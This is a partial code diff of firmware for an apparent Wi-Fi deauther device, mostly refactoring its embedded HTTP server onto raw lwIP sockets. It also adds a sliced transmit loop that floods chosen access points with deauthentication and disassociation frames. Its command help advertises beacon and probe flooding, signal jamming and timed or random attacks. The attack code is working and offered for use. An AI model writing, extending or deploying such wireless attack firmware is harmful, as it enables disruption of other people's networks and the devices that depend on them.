   return json;
@@ -2179,7 +3364,7 @@ String getLogsJSON() {
 //==========================================================
 // HTTP Helpers
 //==========================================================
-String httpHeader(int code, const String &contentType, int contentLength = -1) {
+static int formatHttpHeaderBuf(int code, const char *contentType, int contentLength, char *out, size_t outSize) {
   const char *reason = "OK";
   switch (code) {
     case 200: reason = "OK"; break;
@@ -2193,50 +3378,60 @@ String httpHeader(int code, const String &contentType, int contentLength = -1) {
     case 503: reason = "Service Unavailable"; break;
     default:  reason = "OK"; break;
   }
-  String h;
-  h.reserve(160);
-  h = "HTTP/1.1 " + String(code) + " " + reason + "\r\n";
-  h += "Content-Type: " + contentType + "\r\n";
   // 决策 C：同源访问，不返回 Access-Control-Allow-Origin: *
-  h += "Cache-Control: no-store\r\n";
   if (contentLength >= 0) {
-    h += "Content-Length: " + String(contentLength) + "\r\n";
+    return snprintf(out, outSize,
+                    "HTTP/1.1 %d %s\r\nContent-Type: %s\r\nCache-Control: no-store\r\nContent-Length: %d\r\nConnection: close\r\n\r\n",
+                    code, reason, contentType ? contentType : "text/plain", contentLength);
   }
-  h += "Connection: close\r\n\r\n";
-  return h;
+  return snprintf(out, outSize,
+                  "HTTP/1.1 %d %s\r\nContent-Type: %s\r\nCache-Control: no-store\r\nConnection: close\r\n\r\n",
+                  code, reason, contentType ? contentType : "text/plain");
 }
 
-bool sendLargeText(WiFiClient &client, const char *data, size_t totalLen) {
-  if (!data && totalLen > 0) return false;
+String httpHeader(int code, const String &contentType, int contentLength = -1) {
+  char buf[256];
+  formatHttpHeaderBuf(code, contentType.c_str(), contentLength, buf, sizeof(buf));
+  return String(buf);
+}
+
+bool sendLargeText(int clientSock, const char *data, size_t totalLen) {
+  if (clientSock < 0 || (!data && totalLen > 0)) return false;
   const size_t CHUNK_SIZE = 1024;
   size_t sent = 0;
   unsigned long lastProgressMs = millis();
-  while (sent < totalLen && client.connected()) {
+  while (sent < totalLen) {
+    feedWatchdog();
     size_t toSend = (totalLen - sent > CHUNK_SIZE) ? CHUNK_SIZE : (totalLen - sent);
-    size_t written = client.write((const uint8_t *)data + sent, toSend);
-    if (written > 0) {
-      sent += written;
+    int r = lwip_send(clientSock, data + sent, toSend, 0);
+    if (r > 0) {
+      sent += (size_t)r;
       lastProgressMs = millis();
       if (sent < totalLen) {
         delay(2);  // give lwIP time to drain its send window
       }
     } else {
-      if (!client.connected() || (millis() - lastProgressMs >= 1500)) {
-        return false;
+      int err = (r < 0) ? lwip_getsocklasterr(clientSock) : 0;
+      if (r < 0 && (err == EAGAIN || err == EWOULDBLOCK || err == EINTR) &&
+          (millis() - lastProgressMs < 1500)) {
+        delay(5);
+        continue;
       }
-      delay(5);
+      return false;
     }
   }
   return (sent == totalLen);
 }
 
-bool sendHttpResponse(WiFiClient &client, int code, const String &contentType, const char *body, size_t bodyLen) {
-  String hdr = httpHeader(code, contentType, (int)bodyLen);
-  if (!sendLargeText(client, hdr.c_str(), hdr.length())) {
+bool sendHttpResponse(int clientSock, int code, const char *contentType, const char *body, size_t bodyLen) {
+  char hdrBuf[256];
+  int hn = formatHttpHeaderBuf(code, contentType, (int)bodyLen, hdrBuf, sizeof(hdrBuf));
+  if (hn <= 0 || (size_t)hn >= sizeof(hdrBuf)) return false;
+  if (!sendLargeText(clientSock, hdrBuf, (size_t)hn)) {
     return false;
   }
   if (bodyLen > 0 && body != nullptr) {
-    return sendLargeText(client, body, bodyLen);
+    return sendLargeText(clientSock, body, bodyLen);
   }
   return true;
 }
@@ -2531,6 +3726,8 @@ bool applyTargetSpec(const String &rawSpec, bool allowClearEmpty, String &errMsg
       }
       unlockScanMutex();
     }
+    deauthSlice.reset();
+    disassocSlice.reset();
     return true;
   }
 
@@ -2550,6 +3747,10 @@ bool applyTargetSpec(const String &rawSpec, bool allowClearEmpty, String &errMsg
         ok = target_mode;
       }
       unlockScanMutex();
+    }
+    if (ok) {
+      deauthSlice.reset();
+      disassocSlice.reset();
     }
     return ok;
   }
@@ -2609,6 +3810,10 @@ bool applyTargetSpec(const String &rawSpec, bool allowClearEmpty, String &errMsg
       }
     }
     unlockScanMutex();
+  }
+  if (ok) {
+    deauthSlice.reset();
+    disassocSlice.reset();
   }
   return ok;
 }
@@ -2678,18 +3883,33 @@ bool executeCommand(String command, String *errOut, bool fromHttp) {
     return true;
   }
   else if (command.equalsIgnoreCase("ap on")) {
-    if (fromHttp && apEnabled && softApActive) {
+    bool sniffingNow = false;
+    rtw_enter_critical(NULL, NULL);
+    sniffingNow = (isSniffing || deauth_sniff_enabled);
+    rtw_exit_critical(NULL, NULL);
+    if (!sniffingNow && apEnabled && isSoftApHealthy()) {
+      // Idempotent path: avoid tearing down live SoftAP associations & BT PTA coex when already healthy
+      if (!webServerRunning() && !startWebServer(3)) {
+        if (errOut) *errOut = "WebServer port 80 bind failed";
+        return false;
+      }
       blePushInfo();
       blePushStatus();
+      Serial.println("[INFO] AP + WebUI already active.");
       return true;
     }
     stopAllActiveAttacks();
     haltPromiscSniff();
-    startSoftAP();
+    bool ok = startSoftAP();
     blePushInfo();
     blePushStatus();
-    Serial.println("[INFO] AP + WebUI re-enabled.");
-    return true;
+    if (ok) {
+      Serial.println("[INFO] AP + WebUI re-enabled.");
+      return true;
+    }
+    if (errOut) *errOut = "Failed to start SoftAP / WebServer";
+    Serial.println("[ERROR] AP + WebUI recovery failed.");
+    return false;
   }
   else if (command.equalsIgnoreCase("start deauther") || startsWithIgnoreCase(command, "start deauther ")) {
     String spec = (command.length() > 14) ? command.substring(15) : "";
@@ -2707,6 +3927,7 @@ bool executeCommand(String command, String *errOut, bool fromHttp) {
     if (!priorityStopPending) {
       emergencyStopRequested = false;
     }
+    deauthSlice.reset();
     attack_enabled = true;
     blePushStatus();
     Serial.println("[INFO] Deauthentication Attack started.");
@@ -2739,6 +3960,7 @@ bool executeCommand(String command, String *errOut, bool fromHttp) {
       target_mode = false;
       unlockScanMutex();
     }
+    cancelBleScanPush();
     scan_enabled = true;
     Serial.println("[INFO] Starting scan...");
     bleSendLine("{\"t\":\"scan_begin\"}");
@@ -2749,6 +3971,7 @@ bool executeCommand(String command, String *errOut, bool fromHttp) {
       return true;
     }
     else {
+      cancelBleScanPush();
       scan_enabled = false;
       Serial.println("[ERROR] Scan failed.");
       bleSendLine("{\"t\":\"scan_end\",\"n\":0,\"err\":1}");
@@ -2793,6 +4016,7 @@ bool executeCommand(String command, String *errOut, bool fromHttp) {
     if (!priorityStopPending) {
       emergencyStopRequested = false;
     }
+    deauthSlice.reset();
     startTimedAttack((unsigned long)durationMs);
     blePushStatus();
     Serial.println("[INFO] Timed attack started for " + String(durationMs) + " ms.");
@@ -2810,12 +4034,14 @@ bool executeCommand(String command, String *errOut, bool fromHttp) {
       if (!priorityStopPending) {
         emergencyStopRequested = false;
       }
+      disassocSlice.reset();
       disassoc_enabled = true;
       blePushStatus();
       Serial.println("[INFO] Continuous Disassociation Attack started.");
       return true;
     } else if (disassoc_enabled) {
       disassoc_enabled = false;
+      disassocSlice.reset();
       restoreDefaultChannelIfNeeded(false);
       if (USE_LED) digitalWrite(LED_B, LOW);
       blePushStatus();
@@ -2830,6 +4056,7 @@ bool executeCommand(String command, String *errOut, bool fromHttp) {
       if (!priorityStopPending) {
         emergencyStopRequested = false;
       }
+      disassocSlice.reset();
       disassoc_enabled = true;
       blePushStatus();
       Serial.println("[INFO] Continuous Disassociation Attack started.");
@@ -2947,26 +4174,37 @@ bool executeCommand(String command, String *errOut, bool fromHttp) {
       }
       timedSniffEnabled = false;
       if (alreadySniffing) {
-        wifi_set_promisc(RTW_PROMISC_DISABLE, NULL, 0);
-        rtw_enter_critical(NULL, NULL);
-        isSniffing = false;
-        currentMode = SNIFF_STOP;
-        rtw_exit_critical(NULL, NULL);
+        haltPromiscSniff();
       }
-      // Close listening socket cleanly and use RTW_MODE_STA + promiscuous RX for cloned TX readiness
-      prepareRadioForSniff(true);
-      if (wifi_on(RTW_MODE_STA) != RTW_SUCCESS) {
-        Serial.println("[ERROR] wifi_on(RTW_MODE_STA) failed for deauth_sniff.");
-        if (apEnabled) {
-          startSoftAP();
-        } else {
-          restoreBleCoex();
+      resetPromiscLogThrottle();
+      // Close listening socket cleanly and reuse active STA if already in BLE-only STA mode
+      int wextMode = -1;
+      bool alreadySta = (!apEnabled &&
+                       wlanRuntimeMode == WLAN_MODE_STA &&
+                       wifi_is_up(RTW_STA_INTERFACE) &&
+                       !wifi_is_up(RTW_AP_INTERFACE) &&
+                       wext_get_mode(WLAN0_NAME, &wextMode) == RTW_SUCCESS &&
+                       wextMode == RTW_MODE_INFRA);
+      if (!alreadySta) {
+        prepareRadioForSniff(true);
+        feedWatchdog();
+        if (wifi_on(RTW_MODE_STA) != RTW_SUCCESS) {
+          wlanRuntimeMode = WLAN_MODE_UNINIT;
+          Serial.println("[ERROR] wifi_on(RTW_MODE_STA) failed for deauth_sniff.");
+          if (apEnabled) {
+            startSoftAP();
+          } else {
+            restoreBleCoex(false);
+          }
+          blePushStatus();
+          if (errOut) *errOut = "wifi_on(RTW_MODE_STA) failed";
+          return false;
         }
-        blePushStatus();
-        if (errOut) *errOut = "wifi_on(RTW_MODE_STA) failed";
-        return false;
+        feedWatchdog();
+        wlanRuntimeMode = WLAN_MODE_STA;
       }
-      restoreBleCoex();
+      WiFi.disablePowerSave();
+      restoreBleCoex(!alreadySta);
       resetHopState();
       deauth_sniff_prev_hop = isHopping;
       isHopping = true;
@@ -3224,11 +4462,15 @@ bool executeCommand(String command, String *errOut, bool fromHttp) {
     return true;
   }
   else if (command.equalsIgnoreCase("help")) {
-    Serial.println("Commands: scan, results, start deauther <i,j|all>, stop, disassoc <i,j|all>, random_attack, attack_time <ms> <i,j|all>, clear_logs");
-    Serial.println("Sniffer: start sniff, sniff beacon/probe/deauth/eapol/pwnagotchi/all, sniff_time <ms> <mode>, stop sniff, hop on/off");
-    Serial.println("Config: set ap_ssid/ap_pass/ble_name/cycle_delay/scan_time/num_frames/start_channel/scan_cycles/led/target <val>, reset_config");
+    Serial.println("Scan & Info: scan, results, info, help, tx_stats, reset_txstats");
+    Serial.println("Attack: start deauther [<i,j|all>], disassoc [<i,j|all>], single_ap <index>, random_attack, attack_time <ms> [<i,j|all>], stop [all|deauther]");
+    Serial.println("Flood & Jam: beacon_flood, probe_flood, signal_jam, deauth_sniff");
+    Serial.println("Sniffer: start sniff, sniff beacon/probe/deauth/eapol/pwnagotchi/all, sniff_time <ms> [mode], stop sniff, hop on/off, set ch <c>, clear_logs");
+    Serial.println("Config & AP: set ap_ssid/ap_pass/ble_name/cycle_delay/scan_time/num_frames/start_channel/scan_cycles/led/target <val>, reset_config, ap on/off");
     Serial.println("Web: connect to WiFi '" + String(ap_ssid) + "' and open 192.168.1.1 in browser");
-    bleSendLog("Cmds: scan | results | start deauther <i,j|all> | disassoc <i,j|all> | stop | clear_logs | tx_stats");
+    bleSendLog("Cmds: scan | results | info | help | tx_stats | reset_txstats | ap on/off | stop");
+    bleSendLog("Atk: start deauther/disassoc <i,j|all> | single_ap <index> | random_attack | attack_time <ms> <spec> | beacon_flood | probe_flood | signal_jam | deauth_sniff");
+    bleSendLog("Sniff/Cfg: start sniff | sniff <mode> | sniff_time <ms> [mode] | stop sniff | hop on/off | set ch <c> | clear_logs | set <k> <v> | reset_config");
     return true;
   }
   else {
@@ -3243,6 +4485,87 @@ void handleCommand(String command) {
 //==========================================================
 // Attack Functions
 //==========================================================
+bool stepSlicedTxCycle(SlicedTxCycle &st, bool sendDeauth, bool sendDisassoc, unsigned long frameBudgetPerTick) {
+  if (!st.active) return false;
+  if (frameBudgetPerTick == 0) frameBudgetPerTick = 8;
+
+  auto abortNow = [&]() -> bool {
+    if (shouldAbortCycle()) return true;
+    if (sendDeauth && !attack_enabled) return true;
+    if (!sendDeauth && sendDisassoc && !disassoc_enabled) return true;
+    return false;
+  };
+
+  if (abortNow()) {
+    st.reset();
+    restoreDefaultChannelIfNeeded(false);
+    if (USE_LED) digitalWrite(LED_B, LOW);
+    return false;
+  }
+
+  unsigned long sentThisTick = 0;
+  while (st.active && sentThisTick < frameBudgetPerTick) {
+    if (st.targetIdx >= st.targets.size()) {
+      st.reset();
+      restoreDefaultChannelIfNeeded(false);
+      if (USE_LED) digitalWrite(LED_B, LOW);
+      return false;
+    }
+
+    const WiFiScanResult &tgt = st.targets[st.targetIdx];
+    if (st.frameIdx == 0) {
+      if (wifi_set_channel(tgt.channel) != RTW_SUCCESS) {
+        Serial.print("[WARN] wifi_set_channel(");
+        Serial.print(tgt.channel);
+        Serial.println(") failed");
+        st.targetIdx++;
+        continue;
+      }
+      setCurrentChannelSafe((int)tgt.channel);
+    }
+
+    if (st.frameIdx >= num_send_frames) {
+      st.frameIdx = 0;
+      st.targetIdx++;
+      continue;
+    }
+
+    if (abortNow()) {
+      st.reset();
+      restoreDefaultChannelIfNeeded(false);
+      if (USE_LED) digitalWrite(LED_B, LOW);
+      return false;
+    }
+
+    // 仅发 AP -> Broadcast 的有效帧；src==dst(BSSID->BSSID) 会被 AP 硬件当作回环丢弃
+    if (sendDeauth) {
+      wifi_tx_deauth_frame(tgt.bssid, dst_mac, deauth_reasons[st.frameIdx % num_deauth_reasons]);
+    }
+    if (sendDisassoc) {
+      wifi_tx_disassoc_frame(tgt.bssid, dst_mac, disassoc_reasons[st.frameIdx % num_disassoc_reasons]);
+    }
+
+    st.frameIdx++;
+    sentThisTick++;
+
+    bool hasMoreInTarget = (st.frameIdx < num_send_frames);
+    if (!hasMoreInTarget) {
+      st.frameIdx = 0;
+      st.targetIdx++;
+    }
+    if (st.targetIdx >= st.targets.size()) {
+      st.reset();
+      restoreDefaultChannelIfNeeded(false);
+      if (USE_LED) digitalWrite(LED_B, LOW);
+      return false;
+    }
+    if (sentThisTick < frameBudgetPerTick) {
+      delay(1);
+    }
+  }
+  return st.active;
+}
+
 void targetAttack() {
   std::vector<WiFiScanResult> targets;
   bool isTargetMode = false;
@@ -3254,37 +4577,13 @@ void targetAttack() {
     unlockScanMutex();
   }
   if (isTargetMode && !targets.empty() && attack_enabled) {
+    deauthSlice.reset();
+    deauthSlice.targets = targets;
+    deauthSlice.active = true;
     if (USE_LED) digitalWrite(LED_B, HIGH);
-    bool aborted = false;
-    for (size_t i = 0; i < targets.size(); i++) {
-      if (shouldAbortCycle() || !attack_enabled) {
-        aborted = true;
-        break;
-      }
-      if (wifi_set_channel(targets[i].channel) != RTW_SUCCESS) {
-        Serial.print("[WARN] wifi_set_channel(");
-        Serial.print(targets[i].channel);
-        Serial.println(") failed");
-        continue;
-      }
-      setCurrentChannelSafe((int)targets[i].channel);
-      for (unsigned long j = 0; j < num_send_frames; j++) {
-        if (shouldAbortCycle() || !attack_enabled) {
-          aborted = true;
-          break;
-        }
-        uint16_t reason = deauth_reasons[j % num_deauth_reasons];
-        // 仅发 AP -> Broadcast 的有效帧；src==dst(BSSID->BSSID) 会被 AP 硬件当作回环丢弃，
-        // 徒耗 50% 空口时间
-        wifi_tx_deauth_frame(targets[i].bssid, dst_mac, reason);
-        wifi_tx_disassoc_frame(targets[i].bssid, dst_mac, disassoc_reasons[j % num_disassoc_reasons]);
-        delay(1);
-      }
-      if (aborted) break;
+    while (stepSlicedTxCycle(deauthSlice, true, true, 8)) {
+      feedWatchdog();
     }
-    // 仅在 WebUI SoftAP 开启时回切至热点信道以维持网页连接
-    restoreDefaultChannelIfNeeded(false);
-    if (USE_LED) digitalWrite(LED_B, LOW);
   }
 }
 
@@ -3297,135 +4596,183 @@ void handleWebClient() {
   sniffingNow = isSniffing;
   rtw_exit_critical(NULL, NULL);
   if (!apEnabled || sniffingNow) return;  // ap off 或抓包切出 SoftAP 期间不轮询已关闭的 WebServer
-  WiFiClient client = webServer.available();
-  if (!client || !client.connected()) return;
+  if (!webServerRunning()) {
+    // Self-heal WebServer / SoftAP if apEnabled=true outside active attacks/scans
+    static unsigned long lastSelfHealMs = 0;
+    static unsigned long lastApHealMs = 0;
+    unsigned long nowMs = millis();
+    if (nowMs - lastSelfHealMs >= 2000) {
+      lastSelfHealMs = nowMs;
+      if (wifi_is_up(RTW_AP_INTERFACE)) {
+        softApActive = true;
+        wlanRuntimeMode = WLAN_MODE_AP;
+        if (startWebServer(1)) {
+          Serial.println("[INFO] WebServer self-healed on port 80.");
+        }
+      } else if (!pendingApRestart && !scan_enabled &&
+                 !attack_enabled && !disassoc_enabled &&
+                 !beacon_flood_enabled && !probe_flood_enabled &&
+                 !signal_jam_enabled &&
+                 (nowMs - lastApHealMs >= 5000)) {
+        lastApHealMs = nowMs;
+        Serial.println("[WARN] SoftAP interface down while apEnabled=true; recovering...");
+        startSoftAP();
+      }
+    }
+    return;
+  }
+
+  int client = acceptWebClient();
+  if (client < 0) return;
 
   const size_t MAX_HTTP_REQ_LEN = 4096;
   const unsigned long IDLE_FIRST_BYTE_MS = 250;
   const unsigned long HDR_READ_TIMEOUT_MS = 1000;
   const unsigned long BODY_READ_TIMEOUT_MS = 1200;
 
-  String request;
-  request.reserve(512);
+  // Direct lwIP non-blocking accept + bounded SO_RCVTIMEO=25ms recv into fixed buffer
+  static char httpReqBuf[4098];
+  size_t reqLen = 0;
+  httpReqBuf[0] = '\0';
+
   unsigned long startMs = millis();
-
-  // 差值计时避免 millis() 回绕，并缩短半开/空闲连接阻塞
-  while (client.available() == 0 && client.connected() && (millis() - startMs < IDLE_FIRST_BYTE_MS)) {
-    delay(1);
-  }
-  if (client.available() == 0) {
-    client.stop();
-    return;
-  }
-
   int headerEnd = -1;
   int sepLen = 4;
   bool tooLarge = false;
-  while (client.connected() && (millis() - startMs < HDR_READ_TIMEOUT_MS)) {
-    while (client.available()) {
-      char c = (char)client.read();
-      request += c;
-      if (request.length() > MAX_HTTP_REQ_LEN) {
+  bool peerDead = false;
+
+  auto findHeaderTerm = [&](size_t scanFrom) -> void {
+    const char *crlf = strstr(httpReqBuf + scanFrom, "\r\n\r\n");
+    const char *lflf = strstr(httpReqBuf + scanFrom, "\n\n");
+    if (crlf && (!lflf || crlf < lflf)) {
+      headerEnd = (int)(crlf - httpReqBuf);
+      sepLen = 4;
+    } else if (lflf) {
+      headerEnd = (int)(lflf - httpReqBuf);
+      sepLen = 2;
+    }
+  };
+
+  while (!peerDead && (millis() - startMs < HDR_READ_TIMEOUT_MS)) {
+    feedWatchdog();
+    if (reqLen == 0 && (millis() - startMs >= IDLE_FIRST_BYTE_MS)) {
+      break;
+    }
+    size_t remainCap = (MAX_HTTP_REQ_LEN + 1) - reqLen;
+    if (remainCap == 0) {
+      tooLarge = true;
+      break;
+    }
+    size_t readWant = (remainCap > 512) ? 512 : remainCap;
+    int n = webClientRecv(client, (uint8_t *)(httpReqBuf + reqLen), readWant, peerDead);
+    if (n > 0) {
+      size_t scanFrom = (reqLen > 4) ? (reqLen - 4) : 0;
+      reqLen += (size_t)n;
+      httpReqBuf[reqLen] = '\0';
+      if (reqLen > MAX_HTTP_REQ_LEN) {
         tooLarge = true;
         break;
       }
-      int pos = request.indexOf("\r\n\r\n");
-      if (pos >= 0) {
-        headerEnd = pos;
-        sepLen = 4;
-        break;
-      }
-      pos = request.indexOf("\n\n");
-      if (pos >= 0) {
-        headerEnd = pos;
-        sepLen = 2;
-        break;
-      }
+      findHeaderTerm(scanFrom);
+      if (headerEnd >= 0) break;
     }
-    if (headerEnd >= 0 || tooLarge) break;
-    delay(1);
+  }
+
+  if (reqLen == 0 && headerEnd < 0 && !tooLarge) {
+    closeWebClient(client, false);
+    return;
   }
 
   if (tooLarge) {
-    String errJson = "{\"status\":\"error\",\"message\":\"Request entity too large\"}";
-    sendHttpResponse(client, 413, "application/json", errJson.c_str(), errJson.length());
-    delay(10);
-    client.stop();
+    static const char ERR_413[] = "{\"status\":\"error\",\"message\":\"Request entity too large\"}";
+    bool sentOk = sendHttpResponse(client, 413, "application/json", ERR_413, sizeof(ERR_413) - 1);
+    closeWebClient(client, sentOk);
     return;
   }
 
-  if (request.length() == 0 || headerEnd < 0) {
-    String errJson = "{\"status\":\"error\",\"message\":\"Malformed or timed-out HTTP request\"}";
-    sendHttpResponse(client, 400, "application/json", errJson.c_str(), errJson.length());
-    delay(10);
-    client.stop();
+  if (reqLen == 0 || headerEnd < 0) {
+    static const char ERR_400_TIMEOUT[] = "{\"status\":\"error\",\"message\":\"Malformed or timed-out HTTP request\"}";
+    bool sentOk = sendHttpResponse(client, 400, "application/json", ERR_400_TIMEOUT, sizeof(ERR_400_TIMEOUT) - 1);
+    closeWebClient(client, sentOk);
     return;
   }
 
-  String headers = request.substring(0, (unsigned int)headerEnd);
+  char savedSep = httpReqBuf[headerEnd];
+  httpReqBuf[headerEnd] = '\0';
+  String headers(httpReqBuf);
+  httpReqBuf[headerEnd] = savedSep;
+
   String method = parseMethod(headers);
   String fullPath = parsePath(headers);
   if (method.length() == 0) {
-    String errJson = "{\"status\":\"error\",\"message\":\"Invalid HTTP request line\"}";
-    sendHttpResponse(client, 400, "application/json", errJson.c_str(), errJson.length());
-    delay(10);
-    client.stop();
+    static const char ERR_400_REQ[] = "{\"status\":\"error\",\"message\":\"Invalid HTTP request line\"}";
+    bool sentOk = sendHttpResponse(client, 400, "application/json", ERR_400_REQ, sizeof(ERR_400_REQ) - 1);
+    closeWebClient(client, sentOk);
     return;
   }
 
   long contentLength = 0;
   int clStatus = parseContentLengthHeader(headers, contentLength);
   if (clStatus < 0) {
-    String errJson = "{\"status\":\"error\",\"message\":\"Invalid Content-Length header\"}";
-    sendHttpResponse(client, 400, "application/json", errJson.c_str(), errJson.length());
-    delay(10);
-    client.stop();
+    static const char ERR_400_CL[] = "{\"status\":\"error\",\"message\":\"Invalid Content-Length header\"}";
+    bool sentOk = sendHttpResponse(client, 400, "application/json", ERR_400_CL, sizeof(ERR_400_CL) - 1);
+    closeWebClient(client, sentOk);
     return;
   }
   if ((size_t)contentLength > MAX_HTTP_REQ_LEN ||
       ((size_t)headerEnd + (size_t)sepLen + (size_t)contentLength) > MAX_HTTP_REQ_LEN) {
-    String errJson = "{\"status\":\"error\",\"message\":\"Payload exceeds limit\"}";
-    sendHttpResponse(client, 413, "application/json", errJson.c_str(), errJson.length());
-    delay(10);
-    client.stop();
+    static const char ERR_413_LIMIT[] = "{\"status\":\"error\",\"message\":\"Payload exceeds limit\"}";
+    bool sentOk = sendHttpResponse(client, 413, "application/json", ERR_413_LIMIT, sizeof(ERR_413_LIMIT) - 1);
+    closeWebClient(client, sentOk);
     return;
   }
 
   size_t bodyStart = (size_t)headerEnd + (size_t)sepLen;
-  if (contentLength > 0) {
+  size_t targetTotalLen = bodyStart + (size_t)contentLength;
+  if (contentLength > 0 && reqLen < targetTotalLen) {
     unsigned long bodyWaitStart = millis();
-    while ((request.length() - bodyStart) < (size_t)contentLength &&
-           client.connected() &&
+    bool bodyPeerDead = false;
+    while (reqLen < targetTotalLen &&
+           !bodyPeerDead &&
            (millis() - bodyWaitStart < BODY_READ_TIMEOUT_MS)) {
-      if (client.available()) {
-        while (client.available() && (request.length() - bodyStart) < (size_t)contentLength) {
-          request += (char)client.read();
-        }
-      } else {
-        delay(1);
+      feedWatchdog();
+      size_t need = targetTotalLen - reqLen;
+      int n = webClientRecv(client, (uint8_t *)(httpReqBuf + reqLen), need, bodyPeerDead);
+      if (n > 0) {
+        reqLen += (size_t)n;
+        httpReqBuf[reqLen] = '\0';
       }
     }
-    if ((request.length() - bodyStart) < (size_t)contentLength) {
-      String errJson = "{\"status\":\"error\",\"message\":\"Incomplete request body\"}";
-      sendHttpResponse(client, 408, "application/json", errJson.c_str(), errJson.length());
-      delay(10);
-      client.stop();
+    if (reqLen < targetTotalLen) {
+      static const char ERR_408[] = "{\"status\":\"error\",\"message\":\"Incomplete request body\"}";
+      bool sentOk = sendHttpResponse(client, 408, "application/json", ERR_408, sizeof(ERR_408) - 1);
+      closeWebClient(client, sentOk);
       return;
     }
   }
 
-  String body = (contentLength > 0)
-    ? request.substring((unsigned int)bodyStart, (unsigned int)(bodyStart + (size_t)contentLength))
-    : ((request.length() > bodyStart) ? request.substring((unsigned int)bodyStart) : "");
+  String body;
+  if (contentLength > 0) {
+    char savedEnd = httpReqBuf[targetTotalLen];
+    httpReqBuf[targetTotalLen] = '\0';
+    body = (httpReqBuf + bodyStart);
+    httpReqBuf[targetTotalLen] = savedEnd;
+  } else if (reqLen > bodyStart) {
+    body = (httpReqBuf + bodyStart);
+  }
 
   int qIdx = fullPath.indexOf('?');
   String path = (qIdx >= 0) ? fullPath.substring(0, qIdx) : fullPath;
   String queryStr = (qIdx >= 0) ? fullPath.substring(qIdx + 1) : "";
 
-  Serial.println("[WEB] " + method + " " + fullPath);
+  Serial.print("[WEB] ");
+  Serial.print(method);
+  Serial.print(" ");
+  Serial.println(fullPath);
 
   if (USE_LED) digitalWrite(LED_G, HIGH);
   bool clientClosed = false;
+  static const char ERR_405[] = "{\"status\":\"error\",\"message\":\"Method Not Allowed\"}";
 
   if (path == "/api/scan") {
     if (method == "GET") {
@@ -3434,15 +4781,18 @@ void handleWebClient() {
     } else if (method == "POST") {
       String errMsg;
       if (executeCommand("scan", &errMsg, true)) {
-        String json = "{\"status\":\"scan_complete\",\"count\":" + String(getScanCountSafe()) + "}";
-        sendHttpResponse(client, 200, "application/json", json.c_str(), json.length());
+        char resp[64];
+        int rn = snprintf(resp, sizeof(resp), "{\"status\":\"scan_complete\",\"count\":%lu}",
+                          (unsigned long)getScanCountSafe());
+        sendHttpResponse(client, 200, "application/json", resp, (rn > 0) ? (size_t)rn : 0);
       } else {
-        String json = "{\"status\":\"error\",\"message\":\"" + jsonEscape(errMsg.length() ? errMsg : String("Wi-Fi scan failed")) + "\"}";
-        sendHttpResponse(client, 500, "application/json", json.c_str(), json.length());
+        char escErr[192], resp[256];
+        jsonEscapeToBuf(errMsg.length() ? errMsg.c_str() : "Wi-Fi scan failed", escErr, sizeof(escErr));
+        int rn = snprintf(resp, sizeof(resp), "{\"status\":\"error\",\"message\":\"%s\"}", escErr);
+        sendHttpResponse(client, 500, "application/json", resp, (rn > 0) ? (size_t)rn : 0);
       }
     } else {
-      String json = "{\"status\":\"error\",\"message\":\"Method Not Allowed\"}";
-      sendHttpResponse(client, 405, "application/json", json.c_str(), json.length());
+      sendHttpResponse(client, 405, "application/json", ERR_405, sizeof(ERR_405) - 1);
     }
   }
   else if (path == "/api/status") {
@@ -3450,8 +4800,7 @@ void handleWebClient() {
       String json = getStatusJSON();
       sendHttpResponse(client, 200, "application/json", json.c_str(), json.length());
     } else {
-      String json = "{\"status\":\"error\",\"message\":\"Method Not Allowed\"}";
-      sendHttpResponse(client, 405, "application/json", json.c_str(), json.length());
+      sendHttpResponse(client, 405, "application/json", ERR_405, sizeof(ERR_405) - 1);
     }
   }
   else if (path == "/api/info") {
@@ -3459,8 +4808,7 @@ void handleWebClient() {
       String json = getInfoJSON();
       sendHttpResponse(client, 200, "application/json", json.c_str(), json.length());
     } else {
-      String json = "{\"status\":\"error\",\"message\":\"Method Not Allowed\"}";
-      sendHttpResponse(client, 405, "application/json", json.c_str(), json.length());
+      sendHttpResponse(client, 405, "application/json", ERR_405, sizeof(ERR_405) - 1);
     }
   }
   else if (path == "/api/logs") {
@@ -3468,35 +4816,32 @@ void handleWebClient() {
       String json = getLogsJSON();
       sendHttpResponse(client, 200, "application/json", json.c_str(), json.length());
     } else {
-      String json = "{\"status\":\"error\",\"message\":\"Method Not Allowed\"}";
-      sendHttpResponse(client, 405, "application/json", json.c_str(), json.length());
+      sendHttpResponse(client, 405, "application/json", ERR_405, sizeof(ERR_405) - 1);
     }
   }
   else if (path == "/api/logs/clear") {
     if (method == "POST") {
       String errMsg;
       executeCommand("clear_logs", &errMsg, true);
-      String json = "{\"status\":\"ok\"}";
-      sendHttpResponse(client, 200, "application/json", json.c_str(), json.length());
+      static const char OK_JSON[] = "{\"status\":\"ok\"}";
+      sendHttpResponse(client, 200, "application/json", OK_JSON, sizeof(OK_JSON) - 1);
     } else {
-      String json = "{\"status\":\"error\",\"message\":\"Method Not Allowed\"}";
-      sendHttpResponse(client, 405, "application/json", json.c_str(), json.length());
+      sendHttpResponse(client, 405, "application/json", ERR_405, sizeof(ERR_405) - 1);
     }
   }
   else if (path == "/api/command") {
     if (method != "POST") {
-      String json = "{\"status\":\"error\",\"message\":\"Method Not Allowed\"}";
-      sendHttpResponse(client, 405, "application/json", json.c_str(), json.length());
+      sendHttpResponse(client, 405, "application/json", ERR_405, sizeof(ERR_405) - 1);
     } else {
       String cmd = hasFormKey(body, "cmd") ? getPostValue(body, "cmd") : getQueryParam(fullPath, "cmd");
       cmd.trim();
       if (cmd.length() == 0) {
-        String json = "{\"status\":\"error\",\"message\":\"No command provided\"}";
-        sendHttpResponse(client, 400, "application/json", json.c_str(), json.length());
+        static const char ERR_EMPTY_CMD[] = "{\"status\":\"error\",\"message\":\"No command provided\"}";
+        sendHttpResponse(client, 400, "application/json", ERR_EMPTY_CMD, sizeof(ERR_EMPTY_CMD) - 1);
       } else if (cmd.equalsIgnoreCase("ap off")) {
         // 决策 B：禁止通过 WebUI/HTTP 永久关闭 SoftAP
-        String json = "{\"status\":\"error\",\"message\":\"'ap off' is disabled over WebUI/HTTP; use BLE or Serial.\"}";
-        sendHttpResponse(client, 403, "application/json", json.c_str(), json.length());
+        static const char ERR_AP_OFF[] = "{\"status\":\"error\",\"message\":\"'ap off' is disabled over WebUI/HTTP; use BLE or Serial.\"}";
+        sendHttpResponse(client, 403, "application/json", ERR_AP_OFF, sizeof(ERR_AP_OFF) - 1);
       } else {
         if (isStopCmdCstr(cmd.c_str())) {
           rtw_enter_critical(NULL, NULL);
@@ -3523,14 +4868,18 @@ void handleWebClient() {
